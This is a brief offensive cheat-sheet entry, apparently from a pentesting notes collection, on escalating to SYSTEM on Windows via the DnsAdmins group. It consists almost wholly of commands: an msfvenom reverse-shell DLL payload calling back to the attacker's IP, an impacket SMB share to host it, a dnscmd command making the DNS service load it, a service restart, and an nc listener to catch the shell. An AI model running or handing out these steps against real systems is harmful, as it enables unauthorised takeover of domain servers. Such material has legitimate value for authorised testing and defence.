# DnsAdmins

If the current user is a member of DnsAdmins group, then we can try to escalate privileges.

Generate a payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f dll -o rev.dll
```

Setup an SMB server:

```
impacket-smbserver <share_name> $(pwd) -smb2support
```

On the victim execute this command:

```
dnscmd.exe /config/ /serverlevelplugindll \\<YOUR_IP>\<YOUR_SHARE_NAME>\rev.dll
```

Setup a nc listener:

```
rlwrap nc -lvp 443
```

Restart the DNS service:

```
sc.exe \\victim_hostname stop dns
sc.exe \\victim_hostname start dns
```

Receive a reverse shell as NT AUTHORITY\SYSTEM:

```
rlwrap nc -lvp 443

# DID YOU RECEIVED A SHELL?
```
